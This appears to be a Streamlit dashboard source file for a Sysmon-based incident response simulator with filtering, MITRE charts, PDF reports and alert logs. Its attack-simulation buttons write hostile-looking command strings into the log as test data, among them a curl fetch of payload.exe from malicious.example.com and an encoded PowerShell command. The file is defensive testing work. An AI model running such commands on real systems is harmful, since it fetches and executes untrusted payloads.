import streamlit as st
import pandas as pd
from alert_manager import send_email_alert
from report_generator import generate_report
import streamlit.components.v1 as components
import base64
import os
import csv
from datetime import datetime
import subprocess
import socket
import getpass
import random
import sqlite3

# ✅ First Streamlit command
st.set_page_config(page_title="AI-Powered Incident Response", layout="wide")

# 🔄 Manual Refresh
if st.button("🔄 Refresh Logs"):
    st.rerun()

# === Load Data ===
if not os.path.exists("data/sysmon.csv") or not os.path.exists("data/ai_features.csv"):
    st.error("❌ Required files not found. Please run `parse_sysmon.py` first.")
    st.stop()

df = pd.read_csv("data/sysmon.csv", encoding='utf-8', low_memory=False)
df_feat = pd.read_csv("data/ai_features.csv")

# === Merge AI features ===
df['AnomalyLabel'] = df_feat['AnomalyLabel']
df['MITRE_Technique'] = df_feat['MITRE_Technique']
df['RiskScore'] = df_feat['RiskScore']
df['Severity'] = df_feat['Severity']
df['TimeCreated'] = pd.to_datetime(df['TimeCreated'], format="%Y-%m-%d %H:%M:%S", errors='coerce')

# === Page Title ===
st.title("🛡️ AI-Augmented Real-Time Incident Response Simulator")
st.markdown("### 🔍 Detected Events")

# === Filters ===
option = st.selectbox("Filter by Threat Type", ["All", "Malicious", "Normal"])
if option != "All":
    df = df[df['AnomalyLabel'] == option]

severity_option = st.selectbox("Filter by Severity", ["All", "High", "Medium", "Low"])
if severity_option != "All":
    df = df[df['Severity'] == severity_option]

# === Data Table ===
st.dataframe(df[['TimeCreated', 'Id', 'AnomalyLabel', 'Severity', 'RiskScore', 'MITRE_Technique', 'Message']], use_container_width=True)

# === MITRE Chart ===
st.markdown("### 🎯 MITRE Technique Breakdown")
st.bar_chart(df['MITRE_Technique'].value_counts())

# === Generate & Download PDF Report ===
if st.button("📄 Generate & Download Incident Report"):
    malicious = df[df['AnomalyLabel'] == 'Malicious']
    generate_report(malicious)
    st.success("✅ Report generated successfully!")

    with open("incident_report.pdf", "rb") as f:
        base64_pdf = base64.b64encode(f.read()).decode("utf-8")
        download_html = f"""
        <html>
            <body>
                <a id="autoDownload" href="data:application/pdf;base64,{base64_pdf}" download="incident_report.pdf"></a>
                <script>document.getElementById('autoDownload').click();</script>
            </body>
        </html>
        """
        components.html(download_html)

# === Simulate Attacks ===
st.markdown("---")
st.markdown("## 🎯 Simulate Attacks")

def simulate_attack(event_id, message):
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip_address = f"192.168.1.{random.randint(10, 250)}"
    user = getpass.getuser()
    hostname = socket.gethostname()

    enriched_message = f"{message} | IP={ip_address} | User={user} | Host={hostname}"

    new_row = {
        'TimeCreated': time_now,
        'Id': event_id,
        'Message': enriched_message
    }

    with open("data/sysmon.csv", "a", newline='', encoding='utf-8') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=['TimeCreated', 'Id', 'Message'])
        writer.writerow(new_row)

    subprocess.run(["python", "parse_sysmon.py"])
    st.success("✅ Attack simulated and parsed!")

col1, col2, col3, col4 = st.columns(4)

with col1:
    if st.button("💥 Simulate PowerShell"):
        simulate_attack(1, "powershell.exe -enc ZWNobyBoYWNrZWQ=")

with col2:
    if st.button("🌐 Simulate curl"):
        simulate_attack(3, "curl http://malicious.example.com/payload.exe")

with col3:
    if st.button("🛠️ Simulate Registry Change"):
        simulate_attack(11, "reg add HKCU\\Software\\BadStuff")

with col4:
    if st.button("🛡️ Simulate Rundll32 Execution"):
        simulate_attack(10, "rundll32.exe sus.dll,EntryPoint")

# === Export Alerts Log (.txt only) ===
st.markdown("---")
st.markdown("## 📤 Export Detected Alerts (.txt log)")

LOG_FILE = "logs/alerts.log"

if os.path.exists(LOG_FILE):
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        log_data = f.read()

    st.text_area("📄 Alert Log Preview", log_data, height=300)
    st.download_button("⬇️ Download alerts_log.txt", data=log_data, file_name="alerts_log.txt")

    if st.button("🧹 Clear Logs"):
        open(LOG_FILE, "w").close()
        st.success("✅ Log file cleared. Refresh to update.")
        st.rerun()
else:
    st.info("ℹ️ No alerts have been logged yet.")

# === View Alerts Logged in SQLite ===
st.markdown("---")
st.markdown("## 🗃️ View Database Alerts (SQLite)")

DB_FILE = "logs/alerts.db"

if os.path.exists(DB_FILE):
    try:
        conn = sqlite3.connect(DB_FILE)
        df_sql = pd.read_sql_query("SELECT * FROM alerts ORDER BY timestamp DESC", conn)
        conn.close()

        if not df_sql.empty:
            st.dataframe(df_sql, use_container_width=True)
        else:
            st.info("ℹ️ SQLite database is empty. No alerts logged yet.")
    except Exception as e:
        st.error(f"❌ Failed to read database: {e}")
else:
    st.info("ℹ️ SQLite database not found.")
